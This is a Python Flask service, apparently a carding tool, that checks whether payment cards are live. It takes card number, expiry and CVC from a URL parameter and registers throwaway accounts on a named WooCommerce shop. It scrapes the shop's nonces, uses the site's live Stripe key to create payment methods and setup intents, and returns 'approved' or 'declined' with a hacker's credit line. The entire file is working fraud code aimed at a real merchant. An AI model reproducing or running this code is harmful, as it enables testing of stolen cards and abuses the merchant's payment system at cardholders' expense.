import requests, re, random, json, time
from flask import Flask, request, jsonify

app = Flask(__name__)

class PaymentGatewayProcessor:
    def __init__(self, card_information_string):
        self.card_data = self._parse_card_data(card_information_string)
        self.session_manager = requests.Session()
        self.temporary_username = self._generate_random_username()

    def _parse_card_data(self, card_string):
        components = card_string.strip().split("|")
        if len(components) < 4:
            return None
        return {
            'card_number': components[0],
            'expiration_month': components[1],
            'expiration_year': components[2],
            'security_code': components[3]
        }

    def _generate_random_username(self):
        chars = '1234567890qwertyuiopasdfghjklzxcvbnm'
        return ''.join(random.choices(chars, k=12))

    def _create_user_agent(self):
        version = random.randint(137, 140)
        return f'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{version}.0.0.0 Mobile Safari/537.36'

    def _get_registration_nonce(self):
        try:
            r = self.session_manager.get(
                'https://tourshafts.com/my-account/',
                headers={'User-Agent': self._create_user_agent()}
            )
            m = re.search(r'name="woocommerce-register-nonce" value="(.+?)"', r.text)
            return m.group(1) if m else None
        except Exception:
            return None

    def _register_temporary_account(self):
        nonce = self._get_registration_nonce()
        if not nonce:
            return False
        data = {
            'email': f"{self.temporary_username}@gmail.com",
            'woocommerce-register-nonce': nonce,
            '_wp_http_referer': '/my-account/',
            'register': 'Register',
        }
        try:
            r = self.session_manager.post(
                'https://tourshafts.com/my-account/',
                data=data,
                headers={
                    'User-Agent': self._create_user_agent(),
                    'Content-Type': 'application/x-www-form-urlencoded'
                },
                timeout=30
            )
            return r.status_code == 200
        except Exception:
            return False

    def _get_payment_nonce(self):
        try:
            r = self.session_manager.get(
                'https://tourshafts.com/my-account/add-payment-method/',
                headers={'User-Agent': self._create_user_agent()},
                timeout=30
            )
            m = re.findall(r'"add_card_nonce":"(.+?)"', r.text)
            return m[0] if m else None
        except Exception:
            return None

    def _create_stripe_payment_method(self):
        if not self.card_data:
            return None
        data = {
            'type': "card",
            'card[number]': self.card_data['card_number'],
            'card[cvc]': self.card_data['security_code'],
            'card[exp_month]': self.card_data['expiration_month'],
            'card[exp_year]': self.card_data['expiration_year'],
            'key': "pk_live_mXkZyoWtRXTA7IR4OEqX5auk00Xb8vfP3O"
        }
        headers = {
            'User-Agent': self._create_user_agent(),
            'Accept': "application/json",
        }
        try:
            r = requests.post(
                "https://api.stripe.com/v1/payment_methods",
                data=data,
                headers=headers,
                timeout=30
            )
            if 'id' not in r.text:
                return None
            return r.json()['id']
        except Exception:
            return None

    def _create_setup_intent(self, payment_method_id):
        nonce = self._get_payment_nonce()
        if not nonce:
            return None
        data = {
            'stripe_source_id': payment_method_id,
            'nonce': nonce
        }
        headers = {
            'User-Agent': self._create_user_agent(),
            'X-Requested-With': "XMLHttpRequest",
        }
        try:
            r = self.session_manager.post(
                "https://tourshafts.com?wc-ajax=wc_stripe_create_setup_intent",
                data=data,
                headers=headers,
                timeout=30
            )
            return r.json()
        except Exception:
            return None

    def process_payment(self):
        if not self.card_data:
            return {"status": "error", "message": "Invalid CC format"}

        if not self._register_temporary_account():
            return {"status": "error", "message": "Account registration failed"}

        payment_method_id = self._create_stripe_payment_method()
        if not payment_method_id:
            return {"status": "error", "message": "Payment method creation failed"}

        setup_intent = self._create_setup_intent(payment_method_id)
        if not setup_intent:
            return {"status": "error", "message": "Setup intent failed"}

        if setup_intent.get('status') == 'success':
            return {"status": "approved", "message": "Card Approved ✅"}
        else:
            return {"status": "declined", "message": setup_intent.get('error', {}).get('message', 'Declined ❌')}


@app.route("/", methods=["GET"])
def check_card():
    cc = request.args.get("cc")
    if not cc:
        return jsonify({"error": "Missing cc param"}), 400

    processor = PaymentGatewayProcessor(cc)
    start = time.time()
    result = processor.process_payment()
    result["cc"] = cc
    result["time"] = f"{time.time() - start:.2f}s"
    result["credit"] = "API BY: @hardhackar007"
    return jsonify(result)
